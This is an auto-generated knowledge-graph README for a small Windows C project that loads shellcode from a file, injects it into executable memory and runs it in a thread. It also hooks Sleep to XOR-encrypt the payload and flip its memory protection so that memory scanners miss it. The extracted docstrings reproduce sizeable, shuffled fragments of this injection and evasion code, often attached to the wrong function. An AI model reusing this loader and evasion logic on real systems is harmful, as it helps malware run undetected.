# Polyglot Codebase Knowledge Graph

> Generated offline by **readmenator**. 4 files, 31 symbols, 7 imports. Supports C, C++, Python, Go, Rust, JS/TS, Java, C#, Shell, PHP, Dart, GDScript, Nim, ASM, Ruby, Swift, Kotlin, Scala, Lua, Elixir.
> No LLMs. No tokens. Pure static analysis. See more [here](https://github.com/grisuno/ReadMenator)

**Start here:** Statistics Dashboard for scope, God Nodes for blast radius, Architecture Reference for per-file API. Agents: prefer `readmenator-agent/INDEX.md` + `SYMBOLS.md`.

**Wiki:** prefer `readmenator-wiki/index.md` for progressive disclosure: one synthesis page per community, `connections.json` with EXTRACTED vs INFERRED confidence, `queries.md` log, `REPORT.md` audit.

**Confidence:** EXTRACTED = parsed from source, INFERRED = heuristic bridge, AMBIGUOUS = reported, never hidden. See `readmenator-wiki/REPORT.md`.

**Total Files Parsed:** 4 | **Total Symbols Extracted:** 31 | **Total Imports:** 7
 | **Resolved Imports:** 1

<!-- ranking_model: v1.0 | weights: {ppr:0.45,auth:0.2,test:0.15,doc:0.1,fresh:0.1} | alpha:0.85 | commit:b3ca3bb | date:2026-07-18 -->


## Table of Contents

1. [Statistics Dashboard](#statistics-dashboard)
2. [Architectural Layers](#architectural-layers)
3. [Ranked Context](#ranked-context)
4. [God Nodes](#god-nodes)
5. [Community Analysis](#community-analysis)
6. [Suggested Questions](#suggested-questions)
7. [Hotspot Analysis](#hotspot-analysis)
8. [Change Impact Analysis](#change-impact-analysis)
9. [Suggested Linting Rules](#suggested-linting-rules)
10. [Dataflow Analysis](#dataflow-analysis)
11. [Orphans](#orphans)
12. [Query Recipes](#query-recipes)
13. [Structural Knowledge Map](#structural-knowledge-map)
14. [UML Class Diagram](#uml-class-diagram)
15. [Code Property Graph](#code-property-graph)
16. [Architecture Reference](#architecture-reference)
    - [C (1 files)](#c-1-files)
    - [H (1 files)](#h-1-files)
    - [PY (1 files)](#py-1-files)
    - [SH (1 files)](#sh-1-files)

---

## Statistics Dashboard

| Metric | Value |
|--------|-------|
| Total Files | 4 |
| Total Symbols | 31 |
| Total Imports | 7 |
| Call Edges | 0 |
| Inheritance Edges | 0 |
| Languages | 4 |
| Avg Symbols/File | 7.8 |
| Avg Imports/File | 1.8 |
| Resolved Imports | 1 |

### Top Files by Import Count (Fan-Out)

| File | Imports | Symbols | Language |
|------|---------|---------|----------|
| `header.h` | 5 | 18 | h |
| `app.py` | 1 | 0 | py |
| `main.c` | 1 | 13 | c |

### Top Files by Imported-By Count (Fan-In)

| File | Imported By | Symbols | Language |
|------|-------------|---------|----------|
| `header.h` | 1 | 18 | h |

---

## Architectural Layers

Auto-detected from path patterns, naming conventions, and imported frameworks.

| Layer | Files |
|-------|-------|
| utility | 4 |

### utility

- `app.py` (py, 0 symbols)
- `header.h` (h, 18 symbols)
- `install.sh` (sh, 0 symbols)
- `main.c` (c, 13 symbols)

---

## Ranked Context

Files ranked by composite score for the current query context. The ranking combines Personalized PageRank (query relevance), global authority, test coverage, documentation coverage, and code freshness. Model: v1.0.

| Rank | File | Composite | PPR | Authority | Test | Doc |
|------|------|-----------|-----|-----------|------|-----|
| 1 | `header.h` | 0.4442 | 0.6491 | 0.6491 | 0.00 | 0.22 |
| 2 | `main.c` | 0.3050 | 0.3509 | 0.3509 | 0.00 | 0.77 |
| 3 | `app.py` | 0.1000 | 0.0000 | 0.0000 | 0.00 | 1.00 |
| 4 | `install.sh` | 0.0000 | 0.0000 | 0.0000 | 0.00 | 0.00 |

---

## God Nodes

Most architecturally central files ranked by combined import/export degree and symbol richness.

| File | Score | Connections | PageRank |
|------|-------|-------------|----------|
| `header.h` | 3.8 | | 0.6491 |
| `main.c` | 3.3 | | 0.3509 |
| `app.py` | 0.0 | | 0.0000 |
| `install.sh` | 0.0 | | 0.0000 |

---

## Community Analysis

Files grouped by import-based community detection. Cohesion measures how tightly connected each community is internally.

### root (Cohesion: 1.00)

**2 files** in this community:

- `header.h` (h, 18 symbols)
- `main.c` (c, 13 symbols)

---

## Suggested Questions

Auto-generated exploration prompts based on graph structure:

- What does header.h depend on, and what depends on it? (1 connections)
- What does main.c depend on, and what depends on it? (1 connections)
- What does app.py depend on, and what depends on it? (0 connections)
- What is HookedSleep in header.h and how is it used?
- What is the overall architecture of this codebase?

---

## Hotspot Analysis

Files ranked by combined complexity (symbol count) and centrality (connection count). High-scoring files are architecturally critical and may need refactoring attention.

| File | Complexity | Centrality | Combined | Symbols | Connections |
|------|-----------|------------|----------|---------|-------------|
| `header.h` | 1.000 | 1.000 | 1.000 | 18 | 7 |
| `main.c` | 0.722 | 0.286 | 0.460 | 13 | 2 |
| `app.py` | 0.000 | 0.143 | 0.086 | 0 | 1 |
| `install.sh` | 0.000 | 0.000 | 0.000 | 0 | 0 |

---

## Dataflow Analysis

Procedural intra-function dataflow findings (zero tokens, regex-based heuristics, all INFERRED). Each lead is grounded at file:line for manual review.

**1 findings** (UNCHECKED_ALLOC: 1).

| File | Function | Line | Kind | Variable | Description |
|------|----------|------|------|----------|-------------|
| `main.c` | `readShellcode` | 236 | `UNCHECKED_ALLOC` | `buf` | Result of allocator stored in `buf` is never checked against NULL. |

---

## Change Impact Analysis

Files sorted by how many other files would be affected if they changed. High-impact files should be changed with caution.

| File | Direct Dependents | Transitive Dependents | Total Impact |
|------|------------------|----------------------|--------------|
| `header.h` | 1 | 0 | 1 |
| `app.py` | 0 | 0 | 0 |
| `install.sh` | 0 | 0 | 0 |
| `main.c` | 0 | 0 | 0 |

---

## Suggested Linting Rules

Automatically suggested linting and security rules based on patterns detected in the codebase. These can be exported as Semgrep rules using the `--export-rules` flag.

| Rule ID | Severity | Description | Language | Matches |
|---------|----------|-------------|----------|---------|
| `RM001` | info | Large number of functions in h: 8 total | h | 8 |
| `RM002` | info | Large number of functions in c: 13 total | c | 13 |

---

## Orphans

Files with no documentation or low connectivity. These are candidates for documentation investment or cleanup.

- `install.sh` (0 symbols, no doc)

---

## Query Recipes

Example queries you can run against this knowledge base using the ranking engine:

```
# Find files most relevant to a concept
readmenator query "Where is the import resolver implemented?"

# Rank files by relevance to a topic
readmenator query "How does documentation generation work?"

# Explain why a file ranks highly
readmenator query "explain readmenator/_documentation.py"

# Trace dependency paths with ranked context
readmenator query "path from CLI to exporter"
```

The ranking model uses the following signals:

- **Personalized PageRank** (45% weight): query-specific relevance via seed propagation
- **Global Authority** (20% weight): structural importance via standard PageRank
- **Test Coverage** (15% weight): fraction of symbols referenced in test files
- **Doc Coverage** (10% weight): presence of docstrings and file-level docs
- **Freshness** (10% weight): recent modification activity

Results include score decomposition and justification paths for each ranked item.

---

## Structural Knowledge Map

```mermaid
graph TD
    classDef mod fill:#1e1e1e,stroke:#ff6666,stroke-width:2px,color:#fff;
    classDef cls fill:#2d2d2d,stroke:#4ec9b0,stroke-width:2px,color:#fff;
    classDef fn fill:#333,stroke:#dcdcaa,stroke-width:1px,color:#dcdcaa;
    classDef ext fill:#111,stroke:#666,stroke-dasharray:5 5,color:#aaa;
    subgraph community_0 ["root"]
    header_h["header.h (h)"]
    class header_h mod;
    header_h_HookedSleep["HookedSleep"]
    class header_h_HookedSleep cls;
    header_h --> header_h_HookedSleep
    header_h_FluctuationMetadata["FluctuationMetadata"]
    class header_h_FluctuationMetadata cls;
    header_h --> header_h_FluctuationMetadata
    header_h_HookTrampolineBuffers["HookTrampolineBuffers"]
    class header_h_HookTrampolineBuffers cls;
    header_h --> header_h_HookTrampolineBuffers
    header_h_UPTR["UPTR"]
    class header_h_UPTR fn;
    header_h --> header_h_UPTR
    header_h_UPTR["UPTR"]
    class header_h_UPTR fn;
    header_h --> header_h_UPTR
    main_c["main.c (c)"]
    class main_c mod;
    app_py["app.py (py)"]
    class app_py mod;
    install_sh["install.sh (sh)"]
    class install_sh mod;
    end
    main_c -- resolved_imports --> header_h
    ext_os["os"]
    class ext_os ext;
    app_py -.->|imports| ext_os
    ext_windows_h["windows.h"]
    class ext_windows_h ext;
    header_h -.->|imports| ext_windows_h
    ext_stdio_h["stdio.h"]
    class ext_stdio_h ext;
    header_h -.->|imports| ext_stdio_h
    ext_stdlib_h["stdlib.h"]
    class ext_stdlib_h ext;
    header_h -.->|imports| ext_stdlib_h
    ext_stdint_h["stdint.h"]
    class ext_stdint_h ext;
    header_h -.->|imports| ext_stdint_h
    ext_stdbool_h["stdbool.h"]
    class ext_stdbool_h ext;
    header_h -.->|imports| ext_stdbool_h
    ext_header_h["header.h"]
    class ext_header_h ext;
    main_c -.->|imports| ext_header_h
```



---

## UML Class Diagram

Auto-generated Mermaid class diagram from parsed class-level symbols. Shows classes, structs, interfaces, traits, and their methods with inheritance and dependency relationships.

```mermaid
classDiagram
  class header_h_HookedSleep {
    <<struct>>
    +hookSleep(void);
    +injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);
    +readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);
    +initializeShellcodeFluctuation(LPVOID caller);
    +shellcodeEncryptDecrypt(LPVOID caller);
    +fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);
    +xor32(uint8_t *buf, SIZE_T sz, uint32_t key);
    +isShellcodeThread(LPVOID addr);
  }
  class header_h_FluctuationMetadata {
    <<struct>>
    +hookSleep(void);
    +injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);
    +readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);
    +initializeShellcodeFluctuation(LPVOID caller);
    +shellcodeEncryptDecrypt(LPVOID caller);
    +fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);
    +xor32(uint8_t *buf, SIZE_T sz, uint32_t key);
    +isShellcodeThread(LPVOID addr);
  }
  class header_h_HookTrampolineBuffers {
    <<struct>>
    +hookSleep(void);
    +injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);
    +readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);
    +initializeShellcodeFluctuation(LPVOID caller);
    +shellcodeEncryptDecrypt(LPVOID caller);
    +fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);
    +xor32(uint8_t *buf, SIZE_T sz, uint32_t key);
    +isShellcodeThread(LPVOID addr);
  }
```



---

## Code Property Graph

Machine-readable Code Property Graph (CPG) in JSON-LD format. This block allows AI agents to parse the full structural graph without additional file reads. Compatible with GraphRAG pipelines.

```json
{"@context": "https://schema.org", "analysis": {"communities": [{"cohesion": 1.0, "id": 0, "label": "root", "size": 2}], "god_nodes": [{"node_id": "header.h", "score": 3.8}, {"node_id": "main.c", "score": 3.3}, {"node_id": "app.py", "score": 0.0}, {"node_id": "install.sh", "score": 0.0}], "surprising_connections": []}, "edges": [{"confidence": "EXTRACTED", "relation": "imports", "source": "app.py", "target": "os"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "windows.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdio.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdlib.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdint.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "header.h", "target": "stdbool.h"}, {"confidence": "EXTRACTED", "relation": "imports", "source": "main.c", "target": "header.h"}, {"confidence": "EXTRACTED", "relation": "resolved_imports", "source": "main.c", "target": "header.h"}], "generator": "readmenator", "metadata": {"edge_count": 8, "file_count": 4, "language_count": 4, "symbol_count": 31}, "nodes": [{"doc": "app.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: xx/xx/xxxx Licencia: GPL v3  Descripción:", "id": "app.py", "kind": "module", "label": "app.py", "language": "py", "sha256": "57b21bdb023585b8", "symbol_count": 0, "symbols": []}, {"id": "header.h", "kind": "module", "label": "header.h", "language": "h", "sha256": "2478b315739fa0c8", "symbol_count": 18, "symbols": [{"kind": "struct", "line": 27, "name": "HookedSleep"}, {"kind": "struct", "line": 32, "name": "FluctuationMetadata"}, {"kind": "struct", "line": 40, "name": "HookTrampolineBuffers"}, {"doc": "ifdef _WIN64", "kind": "type_alias", "line": 11, "name": "UPTR", "signature": "typedef UINT64 UPTR;"}, {"doc": "else", "kind": "type_alias", "line": 13, "name": "UPTR", "signature": "typedef UINT32 UPTR;"}, {"doc": "DWORD originalBytesSize; BYTE *previousBytes; DWORD previousBytesSize; } HookTrampolineBuffers; /* ---------- macros / utilidades -------------- #define log(...) do { printf(__VA_ARGS__); putchar('\\n'); fflush(stdout); }while(0) /* ---------- globales exportadas -------------- extern HookedSleep        g_hookedSleep; extern FluctuationMetadata g_fluctuationData; extern TypeOfFluctuation   g_fluctuate; /* ---------- firmas de funciones --------------", "kind": "function", "line": 56, "name": "hookSleep", "signature": "bool hookSleep(void);"}, {"kind": "function", "line": 57, "name": "injectShellcode", "signature": "bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);"}, {"kind": "function", "line": 58, "name": "readShellcode", "signature": "bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);"}, {"kind": "function", "line": 59, "name": "initializeShellcodeFluctuation", "signature": "void initializeShellcodeFluctuation(LPVOID caller);"}, {"kind": "function", "line": 60, "name": "shellcodeEncryptDecrypt", "signature": "void shellcodeEncryptDecrypt(LPVOID caller);"}, {"kind": "function", "line": 61, "name": "fastTrampoline", "signature": "bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);"}, {"kind": "function", "line": 62, "name": "xor32", "signature": "void xor32(uint8_t *buf, SIZE_T sz, uint32_t key);"}, {"kind": "function", "line": 63, "name": "isShellcodeThread", "signature": "bool isShellcodeThread(LPVOID addr);"}, {"doc": "DWORD  protect; } FluctuationMetadata; typedef struct { BYTE *originalBytes; DWORD originalBytesSize; BYTE *previousBytes; DWORD previousBytesSize; } HookTrampolineBuffers; /* ---------- macros / utilidades -------------- #define log(...) do { printf(__VA_ARGS__); putchar('\\n'); fflush(stdout); }while(0) /* ---------- globales exportadas --------------", "kind": "variable", "line": 51, "name": "g_hookedSleep", "signature": "extern HookedSleep g_hookedSleep;"}, {"kind": "variable", "line": 52, "name": "g_fluctuationData", "signature": "extern FluctuationMetadata g_fluctuationData;"}, {"kind": "variable", "line": 53, "name": "g_fluctuate", "signature": "extern TypeOfFluctuation g_fluctuate;"}, {"kind": "macro", "line": 2, "name": "HEADER_H", "signature": "#define HEADER_H"}, {"kind": "macro", "line": 48, "name": "log", "signature": "#define log(...)"}]}, {"id": "install.sh", "kind": "module", "label": "install.sh", "language": "sh", "sha256": "c907d80fd6734993", "symbol_count": 0, "symbols": []}, {"id": "main.c", "kind": "module", "label": "main.c", "language": "c", "sha256": "4cb4b35544b56876", "symbol_count": 13, "symbols": [{"kind": "function", "line": 3, "name": "get_return_address", "signature": "static inline UPTR get_return_address(void)"}, {"doc": "{ #ifdef _WIN64 return (UPTR)__builtin_return_address(0); #else /* 32 bits – también funciona return (UPTR)__builtin_return_address(0); #endif } /* ------------- globales ------------- HookedSleep        g_hookedSleep; FluctuationMetadata g_fluctuationData; TypeOfFluctuation   g_fluctuate; /* ------------- hook ---------------", "kind": "function", "line": 18, "name": "MySleep", "signature": "static void WINAPI MySleep(DWORD ms)"}, {"doc": "b.originalBytesSize = sizeof(g_hookedSleep.sleepStub); /* des-hook temporal fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b); Sleep(ms); if (g_fluctuate == FluctuateToRW) shellcodeEncryptDecrypt(caller); /* re-hook fastTrampoline(true,  (BYTE*)Sleep, (LPVOID)MySleep, NULL); } /* ------------- trampolín -----------", "kind": "function", "line": 43, "name": "fastTrampoline", "signature": "bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)"}, {"doc": "memcpy(target, b->originalBytes, b->originalBytesSize); size = b->originalBytesSize; } typeNtFlushInstructionCache fn; fn = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtFlushInstructionCache\"); if (fn) fn(GetCurrentProcess(), target, size); VirtualProtect(target, size, old, &old); return true; } /* ------------- xor 32 --------------", "kind": "function", "line": 93, "name": "xor32", "signature": "void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)"}, {"kind": "function", "line": 105, "name": "collectMemPriv", "signature": "static void collectMemPriv(void)"}, {"doc": "(mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) ) { if (used == alloc) { alloc = alloc ? alloc*2 : 64; g_memMap = realloc(g_memMap, alloc * sizeof(mbi)); } ((MEMORY_BASIC_INFORMATION*)g_memMap)[used++] = mbi; } addr = (LPBYTE)addr + mbi.RegionSize; } g_memCount = used; } /* ------------- shellcode init -------", "kind": "function", "line": 131, "name": "initializeShellcodeFluctuation", "signature": "void initializeShellcodeFluctuation(LPVOID caller)"}, {"doc": "g_fluctuationData.shellcodeSize = m->RegionSize; g_fluctuationData.currentlyEncrypted = false; g_fluctuationData.encodeKey = ((uint32_t)rand()<<16) ^ (uint32_t)rand(); g_fluctuationData.protect    = PAGE_EXECUTE_READ; log(\"[+] Fluctuation ready: 0x%p  size=%zu  key=%08X\", m->BaseAddress, m->RegionSize, g_fluctuationData.encodeKey); return; } } log(\"[!] Caller not found in MEM_PRIVATE RX/RWX – aborting\"); ExitProcess(0); } /* ------------- es thread shellcode? --", "kind": "function", "line": 159, "name": "isShellcodeThread", "signature": "bool isShellcodeThread(LPVOID addr)"}, {"doc": "ExitProcess(0); } /* ------------- es thread shellcode? -- bool isShellcodeThread(LPVOID addr) { MEMORY_BASIC_INFORMATION mbi; if (!VirtualQuery(addr, &mbi, sizeof(mbi))) return false; if (mbi.Type!=MEM_PRIVATE) return false; DWORD want = (g_fluctuate==FluctuateToRW)?PAGE_READWRITE:PAGE_NOACCESS; return (mbi.Protect & (PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|want)) != 0; } /* ------------- fluctuación -----------", "kind": "function", "line": 169, "name": "shellcodeEncryptDecrypt", "signature": "void shellcodeEncryptDecrypt(LPVOID caller)"}, {"doc": "VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &old); log(\"[>] Flipped to NoAccess\"); } else if (g_fluctuationData.currentlyEncrypted){ VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &old); log(\"[<] Flipped back to RX\"); } g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted; } /* ------------- VEH ------------------", "kind": "function", "line": 207, "name": "VEHHandler", "signature": "LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)"}, {"doc": "#endif log(\"[.] AV at 0x%p\", (void*)ip); UPTR base = (UPTR)g_fluctuationData.shellcodeAddr; UPTR end  = base + g_fluctuationData.shellcodeSize; if (ip>=base && ip<end){ log(\"[+] Shellcode hit – restoring RX & decrypt\"); shellcodeEncryptDecrypt((LPVOID)ip); return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH; } /* ------------- leer archivo ---------", "kind": "function", "line": 230, "name": "readShellcode", "signature": "bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)"}, {"doc": "bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize) { HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL, OPEN_EXISTING,0,NULL); if (h==INVALID_HANDLE_VALUE) return false; DWORD sz = GetFileSize(h,NULL), rd; uint8_t *buf = malloc(sz); bool ok = ReadFile(h,buf,sz,&rd,NULL) && rd==sz; CloseHandle(h); if (ok) { *out=buf; *outSize=sz; } else free(buf); return ok; } /* ------------- inyectar -------------", "kind": "function", "line": 244, "name": "runShellcode", "signature": "static DWORD WINAPI runShellcode(LPVOID param)"}, {"kind": "function", "line": 250, "name": "injectShellcode", "signature": "bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)"}, {"doc": "bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread) { void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PAGE_READWRITE); if (!mem) return false; memcpy(mem,sc,scSize); DWORD old; if (!VirtualProtect(mem,scSize,PAGE_EXECUTE_READ,&old)){ VirtualFree(mem,0,MEM_RELEASE); return false; } outThread = CreateThread(NULL,0,runShellcode,mem,0,NULL); return *outThread != NULL; } /* ------------- main -----------------", "kind": "function", "line": 264, "name": "main", "signature": "int main(int argc, char **argv)"}]}], "type": "CodePropertyGraph", "version": "1.0"}
```

---

## Architecture Reference

### C (1 files)

#### `main.c`
**Path:** `main.c`

**Functions:**
- `get_return_address` (line 3) `static inline UPTR get_return_address(void)`
- `MySleep` (line 18) `static void WINAPI MySleep(DWORD ms)` - *{ #ifdef _WIN64 return (UPTR)__builtin_return_address(0); #else /* 32 bits – también funciona return (UPTR)__builtin_return_address(0); #endif } /* ------------- globales ------------- HookedSleep        g_hookedSleep; FluctuationMetadata g_fluctuationData; TypeOfFluctuation   g_fluctuate; /* ------------- hook ---------------*
- `fastTrampoline` (line 43) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)` - *b.originalBytesSize = sizeof(g_hookedSleep.sleepStub); /* des-hook temporal fastTrampoline(false, (BYTE*)Sleep, (LPVOID)MySleep, &b); Sleep(ms); if (g_fluctuate == FluctuateToRW) shellcodeEncryptDecrypt(caller); /* re-hook fastTrampoline(true,  (BYTE*)Sleep, (LPVOID)MySleep, NULL); } /* ------------- trampolín -----------*
- `xor32` (line 93) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)` - *memcpy(target, b->originalBytes, b->originalBytesSize); size = b->originalBytesSize; } typeNtFlushInstructionCache fn; fn = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache"); if (fn) fn(GetCurrentProcess(), target, size); VirtualProtect(target, size, old, &old); return true; } /* ------------- xor 32 --------------*
- `collectMemPriv` (line 105) `static void collectMemPriv(void)`
- `initializeShellcodeFluctuation` (line 131) `void initializeShellcodeFluctuation(LPVOID caller)` - *(mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) ) { if (used == alloc) { alloc = alloc ? alloc*2 : 64; g_memMap = realloc(g_memMap, alloc * sizeof(mbi)); } ((MEMORY_BASIC_INFORMATION*)g_memMap)[used++] = mbi; } addr = (LPBYTE)addr + mbi.RegionSize; } g_memCount = used; } /* ------------- shellcode init -------*
- `isShellcodeThread` (line 159) `bool isShellcodeThread(LPVOID addr)` - *g_fluctuationData.shellcodeSize = m->RegionSize; g_fluctuationData.currentlyEncrypted = false; g_fluctuationData.encodeKey = ((uint32_t)rand()<<16) ^ (uint32_t)rand(); g_fluctuationData.protect    = PAGE_EXECUTE_READ; log("[+] Fluctuation ready: 0x%p  size=%zu  key=%08X", m->BaseAddress, m->RegionSize, g_fluctuationData.encodeKey); return; } } log("[!] Caller not found in MEM_PRIVATE RX/RWX – aborting"); ExitProcess(0); } /* ------------- es thread shellcode? --*
- `shellcodeEncryptDecrypt` (line 169) `void shellcodeEncryptDecrypt(LPVOID caller)` - *ExitProcess(0); } /* ------------- es thread shellcode? -- bool isShellcodeThread(LPVOID addr) { MEMORY_BASIC_INFORMATION mbi; if (!VirtualQuery(addr, &mbi, sizeof(mbi))) return false; if (mbi.Type!=MEM_PRIVATE) return false; DWORD want = (g_fluctuate==FluctuateToRW)?PAGE_READWRITE:PAGE_NOACCESS; return (mbi.Protect & (PAGE_EXECUTE_READ|PAGE_EXECUTE_READWRITE|want)) != 0; } /* ------------- fluctuación -----------*
- `VEHHandler` (line 207) `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)` - *VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &old); log("[>] Flipped to NoAccess"); } else if (g_fluctuationData.currentlyEncrypted){ VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, g_fluctuationData.protect, &old); log("[<] Flipped back to RX"); } g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted; } /* ------------- VEH ------------------*
- `readShellcode` (line 230) `bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)` - *#endif log("[.] AV at 0x%p", (void*)ip); UPTR base = (UPTR)g_fluctuationData.shellcodeAddr; UPTR end  = base + g_fluctuationData.shellcodeSize; if (ip>=base && ip<end){ log("[+] Shellcode hit – restoring RX & decrypt"); shellcodeEncryptDecrypt((LPVOID)ip); return EXCEPTION_CONTINUE_EXECUTION; } return EXCEPTION_CONTINUE_SEARCH; } /* ------------- leer archivo ---------*
- `runShellcode` (line 244) `static DWORD WINAPI runShellcode(LPVOID param)` - *bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize) { HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL, OPEN_EXISTING,0,NULL); if (h==INVALID_HANDLE_VALUE) return false; DWORD sz = GetFileSize(h,NULL), rd; uint8_t *buf = malloc(sz); bool ok = ReadFile(h,buf,sz,&rd,NULL) && rd==sz; CloseHandle(h); if (ok) { *out=buf; *outSize=sz; } else free(buf); return ok; } /* ------------- inyectar -------------*
- `injectShellcode` (line 250) `bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)`
- `main` (line 264) `int main(int argc, char **argv)` - *bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread) { void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PAGE_READWRITE); if (!mem) return false; memcpy(mem,sc,scSize); DWORD old; if (!VirtualProtect(mem,scSize,PAGE_EXECUTE_READ,&old)){ VirtualFree(mem,0,MEM_RELEASE); return false; } outThread = CreateThread(NULL,0,runShellcode,mem,0,NULL); return *outThread != NULL; } /* ------------- main -----------------*

### H (1 files)

#### `header.h`
**Path:** `header.h`

**Imported by:** `main.c`

**Functions:**
- `hookSleep` (line 56) `bool hookSleep(void);` - *DWORD originalBytesSize; BYTE *previousBytes; DWORD previousBytesSize; } HookTrampolineBuffers; /* ---------- macros / utilidades -------------- #define log(...) do { printf(__VA_ARGS__); putchar('\n'); fflush(stdout); }while(0) /* ---------- globales exportadas -------------- extern HookedSleep        g_hookedSleep; extern FluctuationMetadata g_fluctuationData; extern TypeOfFluctuation   g_fluctuate; /* ---------- firmas de funciones --------------*
- `injectShellcode` (line 57) `bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread);`
- `readShellcode` (line 58) `bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize);`
- `initializeShellcodeFluctuation` (line 59) `void initializeShellcodeFluctuation(LPVOID caller);`
- `shellcodeEncryptDecrypt` (line 60) `void shellcodeEncryptDecrypt(LPVOID caller);`
- `fastTrampoline` (line 61) `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b);`
- `xor32` (line 62) `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key);`
- `isShellcodeThread` (line 63) `bool isShellcodeThread(LPVOID addr);`

**Macros:**
- `HEADER_H` (line 2) `#define HEADER_H`
- `log` (line 48) `#define log(...)`

**Structs:**
- `HookedSleep` (line 27)
- `FluctuationMetadata` (line 32)
- `HookTrampolineBuffers` (line 40)

**Type_Aliases:**
- `UPTR` (line 11) `typedef UINT64 UPTR;` - *ifdef _WIN64*
- `UPTR` (line 13) `typedef UINT32 UPTR;` - *else*

**Variables:**
- `g_hookedSleep` (line 51) `extern HookedSleep g_hookedSleep;` - *DWORD  protect; } FluctuationMetadata; typedef struct { BYTE *originalBytes; DWORD originalBytesSize; BYTE *previousBytes; DWORD previousBytesSize; } HookTrampolineBuffers; /* ---------- macros / utilidades -------------- #define log(...) do { printf(__VA_ARGS__); putchar('\n'); fflush(stdout); }while(0) /* ---------- globales exportadas --------------*
- `g_fluctuationData` (line 52) `extern FluctuationMetadata g_fluctuationData;`
- `g_fluctuate` (line 53) `extern TypeOfFluctuation g_fluctuate;`

### PY (1 files)

#### `app.py`
**Path:** `app.py`
**File Doc:** *app.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: xx/xx/xxxx Licencia: GPL v3  Descripción:*

*No symbols extracted*

### SH (1 files)

#### `install.sh`
**Path:** `install.sh`

*No symbols extracted*
